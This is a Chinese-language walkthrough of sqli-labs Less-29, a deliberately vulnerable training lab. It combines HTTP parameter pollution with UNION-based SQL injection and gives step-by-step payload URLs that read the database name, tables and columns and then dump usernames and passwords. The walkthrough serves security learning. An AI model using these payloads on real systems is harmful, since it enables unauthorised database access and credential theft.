---
title: Less - 29
date: 2023-03-16T15:21:59Z
lastmod: 2023-03-16T23:23:37Z
---

# Less - 29

---

# 通关教程

---

## 1、判断闭合

---

​![image](assets/image-20230316231139-fekovgn.png)​

感觉跟Less-1一样，打开源码文件夹发现存在其他文件，浏览器尝试如下内容

```http
http://192.168.225.132/sqli-labs/Less-29/login.php?id=1
```

​![image](assets/image-20230316231611-n55e0dx.png)​

ID后面输入id=1&id=2，我们使用的web容器为apache，则会执行id=2，如果为tomcat，则会执行id=1，这里我的web容器为apache，所以会执行id=2

​![image](assets/image-20230316231711-bwxb09u.png)​

---

## 2、查看当前库

---

```http
http://192.168.225.132/sqli-labs/Less-29/login.php?id=1&id=-2' union select 1,2,database()--+
```

​![image](assets/image-20230316231837-mdzqyxf.png)​

---

## 3、查看security库下的所有表

---

```http
http://192.168.225.132/sqli-labs/Less-29/login.php?id=1&id=-2' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')--+
```

​![image](assets/image-20230316231927-hpv3jfu.png)​

---

## 4、查看users表下的所有字段

---

```http
http://192.168.225.132/sqli-labs/Less-29/login.php?id=1&id=-2' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users')--+
```

​![image](assets/image-20230316232226-nqok6pd.png)​

---

## 5、查看username,password字段的所有值

---

```http
http://192.168.225.132/sqli-labs/Less-29/login.php?id=1&id=-2' union select 1,2,(select group_concat(concat_ws('~',username,password)) from security.users)--+
```

​![image](assets/image-20230316232329-i04byh0.png)​
